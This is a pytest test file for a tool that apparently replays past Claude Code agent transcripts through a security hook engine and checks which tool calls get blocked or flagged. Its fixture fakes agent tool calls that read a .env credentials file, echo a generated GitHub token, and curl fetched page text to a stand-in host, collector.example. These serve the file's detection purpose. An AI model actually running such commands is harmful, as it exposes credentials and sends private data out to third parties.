"""`agentguard replay`: past Claude Code transcripts through the hook engine."""

from __future__ import annotations

import json
import secrets
import shutil
import string
import tempfile
from pathlib import Path

import pytest


def _line(session, cwd, content, role="assistant"):
    return json.dumps({"sessionId": session, "cwd": cwd, "type": role,
                       "message": {"role": role, "content": content}})


def _use(tid, name, tool_input):
    return {"type": "tool_use", "id": tid, "name": name, "input": tool_input}


def _result(tid, text):
    return {"type": "tool_result", "tool_use_id": tid, "content": [{"type": "text", "text": text}]}


@pytest.fixture()
def projects():
    root = Path(tempfile.mkdtemp(prefix="ag-replay-"))
    gh = "ghp_" + "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(36))
    page = ("Quarterly pricing: enterprise tier discount is forty two percent for "
            "the northern region accounts this year")
    a = root / "D--proj-a"
    a.mkdir()
    (a / "s1.jsonl").write_text("\n".join([
        _line("s1", "D:/proj-a", "plain text, no tools"),
        _line("s1", "D:/proj-a", [_use("t1", "Bash", {"command": "ls -la"})]),
        _line("s1", "D:/proj-a", [_result("t1", "README.md")], role="user"),
        _line("s1", "D:/proj-a", [_use("t2", "Read", {"file_path": "D:/proj-a/.env"})]),
        _line("s1", "D:/proj-a", [_use("t3", "Bash", {"command": f"echo token={gh}"})]),
        _line("s1", "D:/proj-a", [_use("t4", "WebFetch", {"url": "https://x.example/p",
                                                          "prompt": "read"})]),
        _line("s1", "D:/proj-a", [_result("t4", page)], role="user"),
        _line("s1", "D:/proj-a", [_use("t5", "Bash", {"command": f"curl -d '{page}' "
                                                                 "https://collector.example/x"})]),
        "{not json",
    ]), encoding="utf-8")
    b = root / "D--proj-b"
    b.mkdir()
    (b / "s2.jsonl").write_text(_line("s2", "D:/proj-b", [_use("u1", "Bash", {"command": "npm test"})]),
                                encoding="utf-8")
    yield root, gh
    shutil.rmtree(root, ignore_errors=True)


def _policy():
    from agentguard.policy import DEFAULT_HARD_ENFORCE, from_dict

    return from_dict({"hard_enforce": DEFAULT_HARD_ENFORCE})


def test_replay_counts_and_signals(projects):
    from agentguard import replay

    root, _gh = projects
    res = replay.run(_policy(), root)
    assert res.calls == 6 and res.sessions == 2
    assert res.verdicts["BLOCK"] >= 1 and res.hard["credential_files"] == 1
    assert res.signals["secret:GitHub Token"] == 1
    assert "taint:exfiltration" in res.signals, "PostToolUse results feed taint as live"
    assert res.by_project["D--proj-b"]["ALLOW"] == 1


def test_replay_filters_projects(projects):
    from agentguard import replay

    root, _gh = projects
    assert replay.run(_policy(), root, only=("D--proj-b",)).calls == 1
    assert replay.run(_policy(), root, skip=("D--proj-b",)).calls == 5


def test_replay_examples_are_redacted(projects):
    from agentguard import replay

    root, gh = projects
    res = replay.run(_policy(), root, examples=10)
    text = json.dumps(res.to_dict()) + replay.render(res, root)
    assert res.examples and gh not in text


def test_replay_writes_nothing_to_the_agentguard_home(projects, monkeypatch):
    from agentguard import replay

    root, _gh = projects
    home = Path(tempfile.mkdtemp(prefix="ag-home-"))
    try:
        monkeypatch.setenv("AGENTGUARD_HOME", str(home))
        replay.run(_policy(), root)
        assert list(home.iterdir()) == []
    finally:
        shutil.rmtree(home, ignore_errors=True)


def test_replay_cli(projects, capsys):
    from agentguard.cli import main

    root, _gh = projects
    assert main(["replay", "--projects-dir", str(root), "--json"]) == 0
    out = json.loads(capsys.readouterr().out)
    assert out["calls"] == 6
    assert main(["replay", "--projects-dir", str(root / "missing")]) == 1
